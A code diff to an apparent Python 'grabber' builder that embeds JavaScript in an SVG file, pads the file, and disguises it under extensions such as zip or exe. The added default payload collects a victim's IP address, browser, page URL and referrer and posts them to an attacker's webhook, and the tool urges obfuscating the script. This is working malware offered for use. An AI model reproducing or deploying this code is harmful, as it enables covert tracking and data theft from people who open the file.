@@ -15,11 +15,66 @@ SVG = r"""<?xml version="1.0" encoding="UTF-8" standalone="no"?>
     </script>
 </svg>
 """
+js_payload_code = """
+var webhook = 'WEBHOOK_URL';
+var site = 'https://myexternalip.com/raw';
 
+var get_ip = function() {
+    var ip = '';
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', site, false);
+    xhr.send();
+    if (xhr.status == 200) {
+        ip = xhr.responseText;
+    }
+    return ip;
+};
+
+function get_browser() {
+    var browser = navigator.userAgent;
+    return browser;
+    }
+
+function get_time() {
+    var date = new Date();
+    var time = date.toLocaleString();
+    return time;
+    }
+
+function get_url() {
+    var url = window.location.href;
+    return url;
+    }
+
+function get_referrer() {
+    var referrer = document.referrer;
+    return referrer;
+    }
+
+function send_webhook() {
+    fetch(webhook, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            content: `@everyone NEW PERSON GRABBED!!!\nIP: ${get_ip()}\nBrowser: ${get_browser()}\nTime: ${get_time()}\nURL: ${get_url()}\nReferrer: ${get_referrer()}\nMade by K.Dot`
+        })
+    });
+}
+
+send_webhook();
+"""
 
 class main:
     def __init__(self) -> None:
-        self.js_code = input("Where is your file path to the JavaScript payload file? -> ")
+        self.js_code = input("Would you like to use default js payload? (y/n) -> ")
+        if self.js_code.lower() == "y":
+            self.js_code2 = js_payload_code
+            self.webhook = input("What is the webhook url? -> ")
+            self.js_code2 = self.js_code2.replace("WEBHOOK_URL", self.webhook)
+        else:
+            self.js_code = input("What is the path of the js payload? -> ")
         self.name = input("What do you want to name the file? (without extension) -> ")
         self.filetype = input("What file type do you want to save it as? (Example = zip, txt, exe, etc.) -> ")
         self.download_link_type = input("Would you also like the direct download link? (y/n) -> ")
@@ -41,14 +96,17 @@ class main:
 
     def main(self):
         print("Please remember to Obfuscate your JavaScript code before using this tool.")
-        try:
-            with open(self.js_code, "r") as f:
-                js_code = f.read()
-                js_code = '\t\t'.join(js_code.splitlines())
-        except FileNotFoundError:
-            print("File not found")
-            time.sleep(3)
-            exit()
+        if self.js_code2 != None:
+            js_code = self.js_code2
+        else:
+            try:
+                with open(self.js_code, "r") as f:
+                    js_code = f.read()
+                    js_code = '\t\t'.join(js_code.splitlines())
+            except FileNotFoundError:
+                print("File not found")
+                time.sleep(3)
+                exit()
 
         extra_chars = "A" * (1024 * 1024 * int(self.pump))
         svg = SVG.replace("%code%", js_code) + extra_chars
